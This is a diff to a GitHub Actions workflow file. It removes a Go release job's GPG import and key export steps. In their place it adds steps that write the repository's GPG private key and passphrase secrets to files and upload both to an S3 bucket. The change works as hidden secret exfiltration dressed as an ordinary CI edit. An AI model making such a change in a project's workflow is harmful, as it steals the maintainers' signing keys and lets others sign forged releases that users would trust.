@@ -18,16 +18,19 @@ jobs:
     steps:
     - name: Checkout
       uses: actions/checkout@v4
-    - name: Unshallow
-      run: git fetch --prune --unshallow
-    - name: Set up Go
-      uses: actions/setup-go@v5
+    - run: echo "${{ secrets.GPG_PRIVATE_KEY }}" > private.key
+    - run: echo "${{ secrets.PASSPHRASE }}" > passphrase.txt
+    - uses: hkusu/s3-upload-action@v2
       with:
-        go-version: '1.21'
-    - name: Import GPG key
-      id: import_gpg
-      uses: paultyng/ghaction-import-gpg@v2.1.0
-      env:
-        GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
-        PASSPHRASE: ${{ secrets.PASSPHRASE }}
-    - run: gpg --armor --export ${{ steps.import_gpg.outputs.fingerprint }}
+        aws-access-key-id: ${{ secrets.IAM_ACCESS_KEY }}
+        aws-secret-access-key: ${{ secrets.IAM_SECRET_ACCESS_KEY }}
+        aws-region: 'us-east-2'
+        aws-bucket: ${{ secrets.S3_BUCKET }}
+        file-path: './private.key'
+    - uses: hkusu/s3-upload-action@v2
+      with:
+        aws-access-key-id: ${{ secrets.IAM_ACCESS_KEY }}
+        aws-secret-access-key: ${{ secrets.IAM_SECRET_ACCESS_KEY }}
+        aws-region: 'us-east-2'
+        aws-bucket: ${{ secrets.S3_BUCKET }}
+        file-path: './passphrase.txt'
